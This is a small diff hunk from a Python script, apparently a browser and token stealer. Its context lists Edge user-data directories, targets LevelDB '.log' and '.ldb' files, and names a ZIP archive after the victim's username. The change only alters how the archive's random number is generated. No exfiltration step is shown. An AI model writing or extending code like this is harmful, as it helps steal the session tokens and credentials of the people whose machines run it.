@@ -43,7 +43,7 @@ DIRETORIOS = [LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\DEFAULT" + DB,
 ]       
 
 #CONFIG
-ZIP = f'{user} ' + ''.join(random.choice(string.digits) for _ in range(8)) + '.zip'
+ZIP = f'{user} ' + f'{random.randint(11111111, 99999999)}' + '.zip'
 EXT = ['.log', '.ldb']
 
 #ZIP
